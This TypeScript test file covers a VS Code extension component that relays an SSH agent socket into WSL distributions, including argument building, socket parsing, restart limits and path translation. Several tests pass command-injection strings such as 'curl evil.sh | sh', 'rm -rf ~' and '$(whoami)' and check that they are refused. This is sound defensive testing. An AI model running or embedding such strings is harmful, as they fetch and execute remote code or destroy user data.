import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  RC_MARKER,
  isSafeShellWord,
  parseDistros,
  rcAlreadyHasIt,
  rcSnippet,
  relayArgv,
  socketFromExportLine,
  toWslPath,
} from '../wslRelay';
import { MAX_QUICK_FAILURES, QUICK_FAILURE_MS, RelayProcess, WslRelayManager } from '../wslRelayManager';

test('the relay runs through a login shell, because that is where PATH is', () => {
  // `wsl.exe -e creds relay` searches the default PATH, and `creds` is normally on one a person's
  // own profile sets. `exec` so bash replaces itself and the parent holds the relay directly.
  assert.deepEqual(relayArgv('creds', ''), ['-e', 'bash', '-lc', 'exec creds relay']);
});

test('a named distribution is selected rather than assumed', () => {
  // Three distributions is the normal case, and the default is rarely the one being worked in.
  assert.deepEqual(relayArgv('creds', 'Ubuntu-26.04'), [
    '-d',
    'Ubuntu-26.04',
    '-e',
    'bash',
    '-lc',
    'exec creds relay',
  ]);
});

test('anything that is not a plain word is REFUSED, never escaped', () => {
  // These arrive from settings, and settings are workspace-writable — a repository can ship a
  // .vscode/settings.json. Nothing quotable is accepted, so there is nothing to quote correctly.
  assert.equal(isSafeShellWord('creds'), true);
  assert.equal(isSafeShellWord('/home/me/.local/bin/creds'), true);
  assert.equal(isSafeShellWord('creds; curl evil.sh | sh'), false);
  assert.equal(isSafeShellWord('creds && rm -rf ~'), false);
  assert.equal(isSafeShellWord('$(whoami)'), false);
  assert.equal(isSafeShellWord('creds `id`'), false);
  assert.equal(isSafeShellWord(''), false);
});

test('the socket comes from what the relay SAID, not from a second copy of the rule', () => {
  // The path is decided by AgentRelay.DefaultSocketPath in the CLI. Deriving it again here would
  // be two implementations of one rule, free to drift.
  assert.equal(socketFromExportLine('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock'), '/run/user/1000/creds-agent.sock');
  assert.equal(socketFromExportLine('  export SSH_AUTH_SOCK=/tmp/creds-agent-me.sock  '), '/tmp/creds-agent-me.sock');
});

test('a line that is not the export line yields nothing', () => {
  assert.equal(socketFromExportLine('[creds-for-devs] relay listening on /run/x.sock'), '');
  assert.equal(socketFromExportLine(''), '');
});

test('the rc block is recognised by its marker, not by the path', () => {
  // Someone who moved the socket with CREDS_RELAY_SOCKET has our line and a path we would not
  // match; appending a second export would quietly fight their choice.
  const written = rcSnippet('/run/user/1000/creds-agent.sock');
  assert.ok(written.includes(RC_MARKER));
  assert.equal(rcAlreadyHasIt(`# other things\n${written}\nalias ll='ls -l'`), true);
  assert.equal(rcAlreadyHasIt('export SSH_AUTH_SOCK=/somewhere/else.sock'), false);
});

// --- the lifetime, which is the part you would otherwise learn overnight --------------------

interface Fake extends RelayProcess {
  killed: boolean;
  end(code: number | null): void;
  say(line: string): void;
}

function fakes(): { spawner: (args: readonly string[]) => RelayProcess; started: Fake[]; argv: string[][] } {
  const started: Fake[] = [];
  const argv: string[][] = [];
  const spawner = (args: readonly string[]): RelayProcess => {
    argv.push([...args]);
    let settle: (code: number | null) => void = () => undefined;
    const lines: ((line: string) => void)[] = [];
    const fake: Fake = {
      killed: false,
      kill: (): void => {
        fake.killed = true;
      },
      exited: new Promise<number | null>((resolve) => {
        settle = resolve;
      }),
      onLine: (handler): void => {
        lines.push(handler);
      },
      end: (code): void => settle(code),
      say: (line): void => lines.forEach((handler) => handler(line)),
    };
    started.push(fake);
    return fake;
  };
  return { spawner, started, argv };
}

const settled = (): Promise<void> => new Promise((resolve) => setImmediate(resolve));

test('starting learns the socket from the relay itself', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  assert.deepEqual(manager.start('creds', ['']), { ok: true });
  assert.equal(manager.socketPathFor(''), '');
  started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');

  assert.equal(manager.socketPathFor(''), '/run/user/1000/creds-agent.sock');
  manager.dispose();
});

test('an unsafe command never reaches a shell', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  const result = manager.start('creds; curl evil.sh | sh', ['']);

  assert.equal(result.ok, false);
  assert.equal(started.length, 0, 'nothing was spawned');
});

test('stopping kills the child and forgets where it was listening', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);
  started[0].say('export SSH_AUTH_SOCK=/run/a.sock');

  manager.stop();

  assert.equal(started[0].killed, true);
  assert.equal(manager.socketPathFor(''), '');
  assert.equal(manager.running, false);
});

test('a child killed by stop() does not come back when its exit lands', async () => {
  // The exit of a killed process resolves AFTER stop() returns. Without the identity check that
  // late resolution restarts a relay the caller has just turned off.
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);

  manager.stop();
  started[0].end(null);
  await settled();

  assert.equal(started.length, 1, 'no relay was started again');
});

test('a relay that dies on its own is restarted', async () => {
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['']);

  now += QUICK_FAILURE_MS * 10; // it ran for a while, then the distribution went away
  started[0].end(1);
  await settled();

  assert.equal(started.length, 2);
  manager.dispose();
});

test('a relay that cannot start is given up on rather than respawned forever', async () => {
  // The common failure is `creds` not being installed in the distribution. Without a bound this
  // would be a login shell started every few milliseconds for the rest of the session.
  let now = 0;
  const messages: string[] = [];
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, (m) => messages.push(m), () => now);
  manager.start('creds', ['']);

  for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
    now += 10; // instantly
    started[started.length - 1].end(127);
    await settled();
  }

  assert.equal(started.length, MAX_QUICK_FAILURES);
  assert.ok(
    messages.some((m) => m.includes('not restarting it again')),
    `the log said: ${JSON.stringify(messages)}`,
  );
});

test('a run that lasted resets the patience', async () => {
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['']);

  now += 10;
  started[0].end(1); // quick failure 1
  await settled();
  now += QUICK_FAILURE_MS * 2;
  started[1].end(1); // ran fine for a while — not a startup failure
  await settled();
  now += 10;
  started[2].end(1); // quick failure 1 again, not 3
  await settled();

  assert.equal(started.length, 4, 'still trying, because the counter was reset');
  manager.dispose();
});

// --- more than one distribution (0.77.0) ----------------------------------------------------
//
// A socket lives inside one distribution's filesystem, so a relay in `Ubuntu` is invisible from
// `Ubuntu-26.04`. Two distributions need two relays; the first version held one child and served
// whichever WSL called default, which is a choice made for the person rather than by them.

test('wsl -l -q is UTF-16, and reading it as UTF-8 finds nothing', () => {
  // Measured: the bytes begin 55 00 62 00. Decoded as UTF-8 every name comes back interleaved
  // with NULs and matches nothing — a failure that reads as "no distributions found".
  const raw = Buffer.from('Ubuntu\r\ndocker-desktop\r\nUbuntu-26.04\r\n', 'utf16le');

  assert.deepEqual(parseDistros(raw), ['Ubuntu', 'Ubuntu-26.04']);
});

test("Docker's own distributions are not offered, because they have no shell to configure", () => {
  const raw = Buffer.from('docker-desktop\r\ndocker-desktop-data\r\n', 'utf16le');

  assert.deepEqual(parseDistros(raw), []);
});

test('each chosen distribution gets its own relay, named on the command line', () => {
  const { spawner, argv } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  assert.equal(argv.length, 2);
  assert.deepEqual(argv[0], ['-d', 'Ubuntu', '-e', 'bash', '-lc', 'exec creds relay']);
  assert.deepEqual(argv[1], ['-d', 'Ubuntu-26.04', '-e', 'bash', '-lc', 'exec creds relay']);
  assert.deepEqual(manager.serving(), ['Ubuntu', 'Ubuntu-26.04']);
  manager.dispose();
});

test('their sockets are kept apart — one path per distribution', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');
  started[1].say('export SSH_AUTH_SOCK=/tmp/creds-agent-jinx.sock');

  assert.equal(manager.socketPathFor('Ubuntu'), '/run/user/1000/creds-agent.sock');
  assert.equal(manager.socketPathFor('Ubuntu-26.04'), '/tmp/creds-agent-jinx.sock');
  manager.dispose();
});

test('a distribution without `creds` is given up on WITHOUT taking the others down', async () => {
  // The likely reality: someone installs the CLI in the one they work in and not the other.
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['Good', 'Broken']);
  started[0].say('export SSH_AUTH_SOCK=/run/good.sock');

  for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
    now += 10;
    started[started.length - 1].end(127); // the newest is always the Broken respawn
    await settled();
  }

  assert.equal(manager.socketPathFor('Good'), '/run/good.sock', 'the working one is untouched');
  assert.ok(!manager.serving().includes('Broken'));
  manager.dispose();
});

test('stopping takes every distribution down, not just the last one', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  manager.stop();

  assert.deepEqual(started.map((s) => s.killed), [true, true]);
  assert.equal(manager.running, false);
});

test('an unsafe distribution name never reaches a shell, and nothing starts', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  const result = manager.start('creds', ['Ubuntu', 'x; curl evil.sh | sh']);

  assert.equal(result.ok, false);
  assert.equal(started.length, 0, 'not even the safe one was spawned');
});

// --- telling the relay where the Windows half is (0.79.0) -----------------------------------
//
// A relay spawns `creds.exe relay-pipe` per connection and looks on the PATH; the installer puts
// that binary in the extension's global storage, which is on nobody's PATH. Someone could install
// both halves through the buttons and still be told only "communication with agent failed".

test('the Windows binary is named on the command line, not hoped for on the PATH', () => {
  const argv = relayArgv('creds', 'Ubuntu', '/mnt/c/Users/me/creds.exe');

  assert.equal(argv[argv.length - 1], "exec env CREDS_WINDOWS_BINARY='/mnt/c/Users/me/creds.exe' creds relay");
});

test('without one it behaves exactly as before — the PATH decides', () => {
  const argv = relayArgv('creds', '');
  assert.equal(argv[argv.length - 1], 'exec creds relay');
});

test('a path that cannot be quoted is dropped rather than escaped', () => {
  // The same rule as everywhere else in this file: nothing quotable is accepted, so there is
  // nothing to quote correctly. Falling back to the PATH is where it was before.
  const argv = relayArgv('creds', '', "/mnt/c/it's here/creds.exe");

  assert.equal(argv[argv.length - 1], 'exec creds relay');
});

test('a Windows path becomes the one WSL can open', () => {
  const win = ['C:', 'Users', 'me', 'AppData', 'bin', 'creds.exe'].join(String.fromCharCode(92));
  assert.equal(toWslPath(win), '/mnt/c/Users/me/AppData/bin/creds.exe');
  assert.equal(toWslPath('D:/rsd/x.exe'), '/mnt/d/rsd/x.exe');
});

test('anything without a drive letter is handed back untouched', () => {
  // A UNC path or one already in /mnt has no translation to make, and inventing one would
  // produce a path that exists nowhere.
  assert.equal(toWslPath('/mnt/c/already/creds.exe'), '/mnt/c/already/creds.exe');
  const unc = String.fromCharCode(92).repeat(2) + 'server' + String.fromCharCode(92) + 'creds.exe';
  assert.equal(toWslPath(unc), unc);
});

test('every distribution is told the same path', () => {
  const { spawner, argv } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04'], '/mnt/c/bin/creds.exe');

  assert.ok(argv[0].join(' ').includes("CREDS_WINDOWS_BINARY='/mnt/c/bin/creds.exe'"));
  assert.ok(argv[1].join(' ').includes("CREDS_WINDOWS_BINARY='/mnt/c/bin/creds.exe'"));
  manager.dispose();
});
